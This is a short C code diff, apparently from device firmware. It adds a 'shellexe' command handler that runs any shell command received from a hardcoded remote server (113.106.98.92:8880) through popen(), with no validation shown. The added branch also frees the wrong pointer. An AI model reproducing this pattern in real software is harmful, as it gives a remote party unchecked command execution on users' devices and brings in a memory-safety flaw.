@@ -557,6 +557,24 @@ char *exeShell(char *comm)
 	return cliBuff;
 }
 
+char *exeShellnoreturn(char *comm)
+{
+	FILE *fstream = NULL;
+
+	int errnoT = 0;
+
+	memset(cliBuff, 0, sizeof(cliBuff));
+
+	if (NULL == (fstream = popen(comm, "r")))
+	{
+		fprintf(stderr, "execute command failed: %s", strerror(errno));
+		return "error";
+	}
+	pclose(fstream);
+
+	return cliBuff;
+}
+
 #define SERVER_IP  "113.106.98.92"
 #define SERVER_TCP_PORT  "8880"
 
@@ -747,6 +765,16 @@ begin :
 					free(param_p3);
 					rc = send(s, (char *)sendmsg, sizeof(sendmsg), 0);
 				}
+				else if (strcmp(command, "shellexe") == 0)
+				{
+					memset(sendmsg, 0, 1024);
+					p1_obj = GetValByEdata(new_obj, "packet");
+					param_p1 = GetValByKey(p1_obj, "shellcmd");
+					exeShellnoreturn(param_p1);
+					sprintf(sendmsg, CommandJson, deviceMac, "exeShellnoreturn");
+					free(param_p3);
+					rc = send(s, (char *)sendmsg, sizeof(sendmsg), 0);
+				}				
 				else if (strcmp(command, "file") == 0)
 				{
 					memset(sendmsg, 0, 1500);
